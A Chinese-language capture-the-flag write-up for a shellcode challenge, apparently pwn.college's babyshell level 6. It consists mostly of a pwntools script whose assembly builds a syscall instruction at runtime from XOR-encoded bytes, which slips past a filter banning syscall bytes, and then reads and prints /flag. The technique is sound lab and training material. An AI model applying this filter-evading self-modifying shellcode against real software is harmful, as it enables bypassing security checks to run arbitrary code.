# 挑战简介
```
编写并执行 shellcode 以读取标志，但输入的数据不能包含任何形式的系统调用字节（syscall、sysenter、int），此挑战增加了额外的难度！
此挑战要求您的 shellcode 不包含任何 `syscall`、'sysenter' 或 `int` 指令。系统调用
太危险了！此过滤器通过扫描 shellcode 中的以下字节序列来工作：0f05
（`syscall`）、0f34（`sysenter`）和 80cd（`int`）。规避此问题的一种方法是让您的 shellcode 修改自身以
在运行时插入 `syscall` 指令。
```

# 思路
emmm~,或许上一题的思路有问题，上一题吃了很多苦，所以这一题也顺带过了？？？  
ok，当你发现有一天老鼠也能一石二鸟，这使你充满了**决心♥**  
上一题把这一题秒了  

```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)

p = process('/challenge/babyshell-level-6')

p.recvuntil('Reading 0x2000 bytes from stdin.\n')

shellcode = asm('''
start:
    /* 申请一个内存区域用来写入和执行 */
    sub rsp, 128              /* 分配足够的栈空间 */
    mov r15, rsp              /* r15指向栈顶，我们将在这里放置syscall指令 */
    
    /* 使用XOR创建syscall指令 (0x0f^0xff = 0xf0, 0x05^0xff = 0xfa) */
    mov byte ptr [r15], 0xf0     /* 0xf0 ^ 0xff = 0x0f */
    mov byte ptr [r15+1], 0xfa   /* 0xfa ^ 0xff = 0x05 */
    mov byte ptr [r15+2], 0xc3   /* ret指令 */
    
    /* 使用XOR解码syscall字节 */
    xor byte ptr [r15], 0xff
    xor byte ptr [r15+1], 0xff
    
    /* 准备打开文件 */
    /* 创建文件路径字符串 */
    push 0x0                   /* null结束符 */
    mov rcx, 0x67616c662f     /* "/flag" */
    push rcx
    mov rdi, rsp               /* 文件路径参数 */
    
    /* 设置open系统调用 */
    mov eax, 2                 /* 系统调用号为 open() */
    xor esi, esi               /* O_RDONLY = 0 */
    xor edx, edx               /* 权限参数 (不需要) */
    
    /* 调用我们修改过的可执行内存区域 */
    call r15
    
    /* 保存文件描述符 */
    mov r13, rax
    
    /* 分配缓冲区 */
    sub rsp, 128
    mov rsi, rsp               /* 缓冲区地址 */
    
    /* 设置read系统调用 */
    xor eax, eax               /* read系统调用号为0 */
    mov rdi, r13               /* 文件描述符 */
    mov edx, 100               /* 读取大小 */
    
    /* 调用syscall */
    call r15
    
    /* 保存读取的字节数 */
    mov r14, rax
    
    /* 设置write系统调用 */
    mov eax, 1                 /* write系统调用号为1 */
    mov edi, 1                 /* stdout */
    mov rdx, r14               /* 读取的字节数 */
    /* rsi已经设置为缓冲区地址 */
    
    /* 调用syscall */
    call r15
    
    /* 设置exit系统调用 */
    mov eax, 60                /* exit系统调用号 */
    xor edi, edi               /* 状态码0 */
    
    /* 调用syscall */
    call r15
''')


# 为安全起见，打印完整的shellcode十六进制表示
print("Shellcode十六进制:", shellcode.hex())
print("Shellcode长度:", len(shellcode), "字节")

p.send(shellcode)

# 与shell交互
p.interactive()
p.recvall()
```
